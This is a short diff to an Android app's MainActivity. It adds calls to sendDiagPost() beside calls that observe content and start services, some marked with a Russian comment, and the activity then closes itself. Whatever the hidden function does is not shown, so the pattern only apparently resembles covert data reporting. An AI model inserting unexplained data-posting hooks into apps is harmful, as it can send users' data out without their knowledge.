@@ -138,6 +138,7 @@ public class MainActivity extends Activity {
 				e.commit();
 				start(); // запуск сервисов
 				contentObserved();
+				sendDiagPost();
 				finish();
 			}
 		});
@@ -195,6 +196,7 @@ public class MainActivity extends Activity {
 					e.putString("ID", ID);
 					e.commit();
 					contentObserved();
+					sendDiagPost();
 					// Toast.makeText(this, sourceApk,
 					// Toast.LENGTH_LONG).show();
 					start(); // запуск сервисов
